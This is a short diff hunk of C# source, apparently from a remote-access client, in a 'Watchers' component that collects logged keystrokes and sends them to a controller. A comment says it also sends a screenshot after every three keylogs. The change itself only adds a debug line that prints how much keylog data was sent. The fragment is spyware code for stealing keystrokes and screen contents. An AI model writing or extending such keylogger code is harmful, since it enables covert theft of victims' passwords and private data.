@@ -169,8 +169,8 @@ namespace Client.Armitage.Watchers
                 if (RawLogged.Length >= 1)
                 {
                     Communication.String_Stacker.Send(RawLogged.ToString(), Communication.String_Stacker.StringType.Keylog);
+                    Debug.WriteLine($"Keylogger Sent: {RawLogged.Length}");
                     RawLogged.Clear();
-
                     StrokesSend++;
                     /// Send a screenshot every 3 keylogs sent.
                     if (StrokesSend > 2)
